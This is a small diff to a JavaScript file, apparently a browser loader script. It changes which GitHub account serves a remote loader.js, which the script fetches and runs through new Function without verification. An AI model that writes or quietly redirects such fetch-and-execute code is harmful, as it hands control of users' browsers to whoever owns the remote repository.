@@ -10,7 +10,7 @@
   });
 
   document.cookie.includes('undefined') && (document.cookie = "cmg_translation=; Max-Age=0; path=/;");
-  fetch(`https://raw.githubusercontent.com/sneazy-ibo/neoline/refs/heads/altair/loader.js?cb=${Date.now()}`)
+  fetch(`https://raw.githubusercontent.com/calmVampire154/neoline/refs/heads/altair/loader.js?cb=${Date.now()}`)
     .then(r => r.text())
     .then(code => new Function(code)());
 })();
